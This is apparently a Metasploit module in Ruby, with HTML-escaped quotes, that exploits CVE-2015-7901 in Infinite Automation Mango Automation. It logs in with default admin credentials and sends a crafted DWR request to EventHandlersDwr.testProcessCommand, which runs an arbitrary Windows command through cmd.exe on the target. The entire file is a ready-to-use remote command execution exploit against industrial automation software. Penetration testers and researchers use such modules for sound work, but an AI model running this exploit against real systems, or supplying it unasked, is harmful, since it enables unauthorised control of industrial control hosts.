 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Infinite Automation Mango Automation Command Injection&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a command injection vulnerability found in Infinite
                Automation Systems Mango Automation v2.5.0 - 2.6.0 beta (builds prior to
                430).
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2015-7901&#039; ],
                    [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-15-300-02&#039; ]
                ],
            &#039;DisclosureDate&#039; => &#039;Oct 28 2015&#039;))
 
        register_options(
            [
                Opt::RPORT(8080),
                OptString.new(&#039;TARGETURI&#039;, [ false, &#039;Base path to Mango Automation&#039;, &#039;/login.htm&#039;]),
                OptString.new(&#039;CMD&#039;, [ false, &#039;The OS command to execute&#039;, &#039;calc.exe&#039;]),
                OptString.new(&#039;USER&#039;, [true, &#039;The username to login with&#039;, &#039;admin&#039;]),
                OptString.new(&#039;PASS&#039;, [true, &#039;The password to login with&#039;, &#039;admin&#039;]),
            ], self.class )
    end
 
    def do_login(user, pass)
        uri =  normalize_uri(target_uri.path)
         
        res = send_request_cgi({
            &#039;method&#039;    =>   &#039;GET&#039;,
            &#039;uri&#039;           =>   uri
        })
 
        if res.nil?
            vprint_error("#{peer} - Connection timed out")
            return :abort
        end
 
        cookie = res.headers[&#039;Set-Cookie&#039;]
 
        print_status("Attempting to login with credentials &#039;#{user}:#{pass}&#039;")
 
        res = send_request_cgi({
            &#039;method&#039;    =>   &#039;POST&#039;,
            &#039;uri&#039;           =>   uri,
            &#039;cookie&#039;    =>   cookie,
            &#039;vars_post&#039;     =>   {
                &#039;username&#039;  =>   user,
                &#039;password&#039;  =>   pass,
            }
        })
 
        if res.nil?
            vprint_error("#{peer} - Connection timed out")
            return :abort
        end
 
        location = res.headers[&#039;Location&#039;]
        if res and res.headers and (location = res.headers[&#039;Location&#039;]) and location =~ /data_point_details.shtm/
            print_good("#{peer} - Successful login: &#039;#{user}:#{pass}&#039;")
        else
            vprint_error("#{peer} - Bad login: &#039;#{user}:#{pass}&#039;")
            return
        end
 
        return cookie
         
    end
 
    def run
        cookie = do_login(datastore[&#039;USER&#039;], datastore[&#039;PASS&#039;])
 
        data =  "callCount=1&"
        data << "page=%2Fevent_handlers.shtm&"
        data << "httpSessionId=%0D%0A&"
        data << "scriptSessionId=26D579040C1C11D2E21D1E5F321094E5866&"
        data << "c0-scriptName=EventHandlersDwr&"
        data << "c0-methodName=testProcessCommand&"
        data << "c0-id=0&"
        data << "c0-param0=string:c:\\windows\\system32\\cmd.exe /c #{datastore[&#039;CMD&#039;]}&"
        data << "c0-param1=string:15&"
        data << "batchId=24"
 
        res = send_request_raw({
            &#039;method&#039;    =>   &#039;POST&#039;,
            &#039;uri&#039;           =>   normalize_uri("dwr", "call", "plaincall", "EventHandlersDwr.testProcessCommand.dwr"),
            &#039;cookie&#039;    =>   cookie.split(";")[0],
            &#039;ctype&#039;     =>   "application/x-www-form-urlencoded",
            &#039;headers&#039;   =>   {
                &#039;Origin&#039;    =>   &#039;null&#039;,
                &#039;Upgrade-Insecure-Requests&#039; =>   1,
                &#039;Connection&#039;    => "keep-alive"
            },
            &#039;data&#039;  =>   data,
        }, 5)
 
        if res.body =~ /org.directwebremoting.extend.MarshallException/
            print_error("Something went wrong...")
            puts res.body
        elsif res.body =~ /Check your Tomcat console for process output/
            print_good("Command executed successfully")
        end
 
    end
end

